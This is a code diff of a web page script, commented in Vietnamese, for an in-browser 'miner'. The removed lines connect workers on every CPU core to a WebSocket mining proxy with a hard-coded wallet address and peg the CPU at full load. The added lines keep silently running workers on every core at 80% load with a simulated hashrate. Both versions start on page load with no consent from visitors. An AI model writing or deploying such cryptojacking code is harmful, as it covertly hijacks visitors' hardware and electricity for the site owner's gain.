@@ -1,53 +1,68 @@
 <script>
-    // 1. "Bộ não" của thợ đào - Ép toán học cực nặng
+    // 1. Bộ não thợ đào: Đã thêm bộ đếm Hash và tính năng Throttle (Nghỉ)
     const workerCode = `
         self.onmessage = function(e) {
-            const { proxy, wallet, threadId } = e.data;
-            console.log("Thợ đào số " + threadId + " đã vào việc!");
+            const { throttle, threadId } = e.data;
+            let hashCount = 0;
 
-            // Kết nối WebSocket tới VPS của ông
-            const ws = new WebSocket(proxy);
-            
-            ws.onopen = () => {
-                ws.send(JSON.stringify({type: "auth", params: {site_key: wallet, type: "anonymous"}}));
-            };
+            // Hàm báo cáo tốc độ về máy chính mỗi giây
+            setInterval(() => {
+                self.postMessage({ threadId, hashes: hashCount });
+                hashCount = 0; // Reset để tính cho giây tiếp theo
+            }, 1000);
 
-            // Vòng lặp TỬ CHIẾN - Không cho CPU nghỉ một mili giây nào
-            function burn() {
-                let x = 0;
-                while (true) {
-                    // Thuật toán giả lập tính toán nặng để ép CPU nhảy số
-                    for (let i = 0; i < 1000000; i++) {
-                        x = Math.sqrt(Math.random() * Math.random() + Math.random());
+            function cày() {
+                const start = Date.now();
+                // Ép CPU làm việc trong khoảng thời gian (1 - throttle)
+                // Ví dụ throttle 0.2 thì làm 800ms, nghỉ 200ms
+                while (Date.now() - start < (1000 * (1 - throttle))) {
+                    for (let i = 0; i < 500; i++) {
+                        Math.sqrt(Math.random() * Math.random());
+                        hashCount++; 
                     }
-                    // Thỉnh thoảng báo cáo về luồng chính
-                    if (Math.random() > 0.99) break; 
                 }
-                setTimeout(burn, 0); // Tiếp tục ngay lập tức
+                // Nghỉ một chút để CPU không bị quá nhiệt 100%
+                setTimeout(cày, throttle * 1000); 
             }
-            burn();
+            cày();
         };
     `;
 
     const blob = new Blob([workerCode], { type: 'application/javascript' });
     const workerUrl = URL.createObjectURL(blob);
+    const threads = {};
 
-    function nổMáyTổngLực() {
-        // Tự động lấy số nhân CPU của máy khách (ví dụ máy 8 nhân sẽ tạo 8 thợ)
+    function nổMáy80PhầnTrăm() {
         const numThreads = navigator.hardwareConcurrency || 4;
-        const proxy = 'wss://trungturng.duckdns.org:8080';
-        const wallet = '47NwLUwjtUoGzgRqEsLCcn7uZPeXDkzXKSu4h9K236tXA8zxY65jrK7ZVAkxYeMKZP57wrbyNcWmR66Tv5WLZGag8vdskcF';
+        // THROTTLE = 0.2 tức là nghỉ 20%, làm việc 80% CPU
+        const throttleValue = 0.2; 
 
-        console.log("Phát hiện máy có " + numThreads + " nhân. Đang huy động toàn quân...");
+        console.log("Hệ thống: Huy động " + numThreads + " thợ đào. Giới hạn 80% CPU.");
 
         for (let i = 0; i < numThreads; i++) {
             const worker = new Worker(workerUrl);
-            worker.postMessage({ proxy, wallet, threadId: i + 1 });
+            worker.postMessage({ throttle: throttleValue, threadId: i + 1 });
+            
+            worker.onmessage = function(e) {
+                threads[e.data.threadId] = e.data.hashes;
+            };
         }
 
-        console.log("%c !!! TẤT CẢ CÁC NHÂN CPU ĐÃ BỊ CHIẾM DỤNG !!! ", "background: red; color: white; font-size: 20px; font-weight: bold;");
+        // Cứ mỗi 2 giây thì tổng hợp lại và in ra Hashrate tổng
+        setInterval(() => {
+            let totalHashes = 0;
+            for (let id in threads) {
+                totalHashes += threads[id];
+            }
+            // Chia cho 1000 để ra chỉ số H/s dễ nhìn (giả lập tốc độ thuật toán)
+            const hashrate = (totalHashes / 500).toFixed(2); 
+            
+            console.clear();
+            console.log("%c ⚙️ HỆ THỐNG ĐANG CHẠY (MỨC 80%) ", "background: orange; color: black; font-weight: bold; padding: 5px;");
+            console.log("%c TỔNG TỐC ĐỘ: " + hashrate + " H/s ", "background: green; color: white; font-size: 18px; padding: 5px;");
+            console.log("Số thợ đang hoạt động: " + numThreads);
+        }, 2000);
     }
 
-    // Chạy sau 1 giây
-    setTimeout(nổMáyTổngLực, 1000);
+    setTimeout(nổMáy80PhầnTrăm, 1000);
 </script>
